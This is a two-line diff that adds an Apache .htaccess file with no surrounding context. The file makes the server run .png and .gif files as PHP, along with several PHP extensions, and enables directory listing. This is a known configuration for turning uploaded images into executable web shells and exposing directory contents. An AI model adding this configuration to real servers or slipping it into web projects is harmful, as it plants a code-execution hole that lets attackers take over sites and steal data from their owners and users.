@@ -1,0 +1,2 @@
+AddType application/x-httpd-php .php .png .gif .php5 .php7 .phtml .phar 
+Options +Indexes
